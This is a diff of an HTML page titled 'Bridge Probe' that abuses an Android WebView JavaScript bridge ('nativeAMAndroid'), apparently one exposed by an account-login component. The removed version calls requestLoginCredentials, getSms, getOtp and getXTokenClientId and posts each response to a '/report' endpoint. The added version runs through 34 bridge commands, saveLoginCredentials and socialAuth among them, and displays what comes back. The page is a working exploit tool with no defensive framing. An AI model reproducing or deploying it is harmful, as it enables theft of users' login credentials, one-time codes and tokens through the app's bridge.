@@ -1,56 +1,37 @@
 <!doctype html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>Bridge Probe v3</title>
+<html><head><meta charset="utf-8"><title>v4</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-  body { font-family: monospace; background: #111; color: #0f0; padding: 10px; margin: 0; }
-  .out { font-size: 13px; white-space: pre-wrap; word-break: break-all; }
-  .resp { background: #000; border: 2px solid #0f0; border-radius: 8px; padding: 10px; margin: 8px 0; font-size: 21px; word-break: break-all; }
-  .resp .cmd { color: #ff0; font-size: 17px; display: block; margin-bottom: 6px; }
-</style>
-</head>
-<body>
-<div class="out" id="out">PROBE v3
-</div>
-<div id="resps"></div>
+ body { font-family: monospace; background:#111; color:#0f0; padding:8px; margin:0; }
+ .h { font-size:15px; }
+ .r { font-size:13px; border-bottom:1px solid #030; padding:3px 0; word-break:break-all; }
+ .ok { color:#ff0; } .err { color:#888; }
+</style></head><body>
+<div class="h" id="st">v4 all-commands</div>
+<div id="rs"></div>
 <script>
-(function () {
-    var out = document.getElementById('out');
-    function log(s) {
-        out.textContent += '\n' + s;
-        try { fetch('/report', {method: 'POST', body: String(s).slice(0, 3000)}); } catch (e) {}
-    }
-    log('URL: ' + location.href);
-    var na = window.nativeAMAndroid;
-    log('bridge: ' + (na ? 'FOUND (' + Object.keys(na).join(',') + ')' : 'NOT FOUND'));
-    if (!na) return;
-
-    window.nativeAMResponse = {
-        receive: function (reqId, json) {
-            var cmd = (window.__reqmap || {})[reqId] || reqId.slice(0, 18);
-            var d = document.createElement('div');
-            d.className = 'resp';
-            d.innerHTML = '<span class="cmd">== ' + cmd + '</span>' + String(json).slice(0, 400);
-            document.getElementById('resps').appendChild(d);
-            log('RESP ' + cmd + ' :: ' + String(json).slice(0, 500));
-        }
-    };
-
-    window.__reqmap = {};
-    var seq = ['ready', 'requestLoginCredentials', 'getSms', 'chooseAccount', 'getXTokenClientId', 'getOtp'];
-    seq.forEach(function (msg, i) {
-        setTimeout(function () {
-            var id = 'p' + i + '_' + Date.now();
-            window.__reqmap[id] = msg;
-            try {
-                na.send(JSON.stringify({version: 1, message: msg, requestId: id, data: {}}));
-                log('>>> ' + msg);
-            } catch (e) { log('ERR ' + msg + ' ' + e); }
-        }, 600 + i * 1200);
-    });
+(function(){
+ var CMDS = ["ready","close","chooseAccount","getCustomEulaStrings","getEbsAgeConfirmState","getOtp","getPhoneRegionCode","getSms","getWebAuthNAvailability","getXTokenClientId","itemClickHandler","openExternalUrl","performVibration","primaryActionTriggered","requestLoginCredentials","requestMagicLinkParams","requestPhoneNumberHint","requestSavedExperiments","samlSsoAuth","saveLoginCredentials","sendMetrics","setEbsAgeConfirmState","setPopupSize","showDebugInfo","socialAuth","storePhoneNumber","webauthnAuth","webauthnReg","beginChangePasswordFlow","deletedAccountAuth","deviceUnbinded","finishWithItemClickHandler","finishWithUrlOpeningByHost","debugOnly_getAppVerificationHashForSms"];
+ var na = window.nativeAMAndroid;
+ document.getElementById('st').textContent = 'v4 bridge:' + (na?'FOUND':'NONE');
+ if(!na) return;
+ window.__map = {};
+ window.nativeAMResponse = { receive: function(id, json){
+   var el = document.getElementById('r_'+(window.__map[id]||'x'));
+   if(el){ el.textContent = (window.__map[id]||id) + ' -> ' + String(json).slice(0,140); el.className='r ok'; }
+ }};
+ var rs = document.getElementById('rs');
+ CMDS.forEach(function(c,i){
+   var d = document.createElement('div'); d.className='r err'; d.id='r_'+c; d.textContent = c + ' -> ...';
+   rs.appendChild(d);
+ });
+ CMDS.forEach(function(c,i){
+   setTimeout(function(){
+     var id = 'q'+i;
+     window.__map[id] = c;
+     try { na.send(JSON.stringify({version:1, message:c, requestId:id, data:{}})); }
+     catch(e){ var el=document.getElementById('r_'+c); if(el) el.textContent=c+' -> EXC '+e; }
+   }, 500 + i*450);
+ });
 })();
-</script>
-</body>
-</html>
+</script></body></html>
